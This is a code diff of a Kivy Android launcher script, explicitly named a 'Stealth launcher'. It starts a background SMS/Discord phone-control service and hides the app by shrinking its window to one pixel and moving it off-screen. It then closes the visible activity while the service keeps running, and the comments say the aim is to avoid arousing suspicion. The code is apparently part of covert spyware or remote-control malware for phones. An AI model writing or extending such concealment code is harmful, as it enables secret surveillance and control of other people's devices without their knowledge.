@@ -1,52 +1,51 @@
 """
-Stealth launcher — starts Discord bot in background thread.
-Shows a minimal black screen to not arouse suspicion.
+Stealth launcher — starts background service, finishes immediately.
 """
 import threading
-import asyncio
+import sys
 
 from kivy.app import App
 from kivy.clock import Clock
-from kivy.uix.widget import Widget
 from kivy.core.window import Window
 
-bot_started = False
+# Start the SMS/Discord service in background
+_service_started = False
 
-def run_bot():
-    """Run the Discord bot in this thread's event loop."""
-    global bot_started
-    if bot_started:
+def start_service():
+    global _service_started
+    if _service_started:
         return
-    bot_started = True
+    _service_started = True
     
-    import bot
-    
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
     try:
-        token = bot.get_token()
-        if not token:
-            return
-        
-        client = bot.PhoneBot(intents=bot.intents)
-        loop.run_until_complete(client.start(token))
-    except Exception as e:
-        print(f"Bot error: {e}")
-    finally:
-        loop.close()
+        # P4A service
+        import android
+        svc = android.AndroidService("SmsService", "service.py")
+        svc.start("")
+    except ImportError:
+        # Running locally (testing) — just import and run
+        import service
+        import threading
+        t = threading.Thread(target=service.main, daemon=True)
+        t.start()
 
 class StealthApp(App):
     def build(self):
-        # Hide the window title bar / minimize visual presence
+        # Minimize window first
         Window.size = (1, 1)
-        Window.left = -2000  # Push off-screen
+        Window.left = -2000
         
-        # Start bot in background
-        t = threading.Thread(target=run_bot, daemon=True)
+        # Start service in background thread
+        t = threading.Thread(target=start_service, daemon=True)
         t.start()
         
-        # Return an empty widget - app stays running, bot keeps working
-        return Widget()
+        # Close the activity after a brief moment
+        Clock.schedule_once(lambda dt: self.stop(), 0.3)
+        return None  # No GUI
+
+    def on_stop(self):
+        # When activity is destroyed, service continues running
+        pass
 
 if __name__ == "__main__":
     StealthApp().run()
